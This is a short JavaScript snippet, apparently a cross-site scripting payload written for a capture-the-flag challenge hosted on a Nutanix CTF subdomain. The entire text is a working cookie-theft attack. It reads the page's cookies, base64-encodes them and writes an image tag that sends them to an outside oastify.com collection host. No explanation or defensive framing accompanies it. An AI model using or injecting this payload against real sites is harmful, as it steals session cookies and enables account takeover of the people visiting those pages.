const xhr = new XMLHttpRequest();
xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
let ck = document.cookie;
xhr.onreadystatechange = function() {
  document.write('<img src=http://w30mh75olm56uzy7ch3tfv9ev51vpk.oastify.com/leak.txt?' + btoa(ck) + '>');
};
xhr.send();
